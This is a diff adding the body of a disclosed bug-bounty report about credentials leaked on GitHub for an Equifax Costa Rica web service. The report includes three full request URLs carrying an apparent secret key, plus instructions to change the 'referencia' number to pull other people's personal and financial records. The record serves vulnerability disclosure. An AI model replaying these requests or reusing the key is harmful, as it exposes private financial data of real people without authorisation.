@@ -7,6 +7,7 @@ tags:
 substate: "resolved"
 weakness: null
 enriched: true
+body: true
 date: 2020-04-09
 submitted: 2019-09-14T18:01:00.202Z
 bounty_usd: null
@@ -24,6 +25,29 @@ title: "Information Leak (Github)"
 - Report: [https://hackerone.com/reports/694931](https://hackerone.com/reports/694931)
 - CWE: N/A
 - Submitted: 2019-09-14T18:01:00.202Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+In Github I found some credentials to use in a webservice that exposes very sensitive information of people, family group, financial situation, and more.
+
+Github:
+https://github.com/geraldincg/proyecto/blob/9c89787deb1d217f58b58786d90bfb3eab290237/Proyecto/ViewModels/WebService/ConexionWS.cs
+
+The  webservice is subdomain for Costa Rica:
+Change "referencia" identification number to obtain different results.
+Example:
+
+https://webservices.equifax.cr/webservices/efx_consultas.asmx/Estudio_360_Fisico?referencia=891550&Cedula=&Usuario=&Clave=EKJH1QF2IXL3FSI4APWSD5XWFGX63KLK76JFXU80RTCQWS&Usuario_Datum=
+
+https://webservices.equifax.cr/webservices/efx_consultas.asmx/Estudio_360_Fisico?referencia=891547&Cedula=&Usuario=&Clave=EKJH1QF2IXL3FSI4APWSD5XWFGX63KLK76JFXU80RTCQWS&Usuario_Datum=
+
+https://webservices.equifax.cr/webservices/efx_consultas.asmx/Estudio_360_Fisico?referencia=891543&Cedula=&Usuario=&Clave=EKJH1QF2IXL3FSI4APWSD5XWFGX63KLK76JFXU80RTCQWS&Usuario_Datum=
+
+## Impact
+
+An attacker can extract information any people in the system.
 
 ## Timeline
 
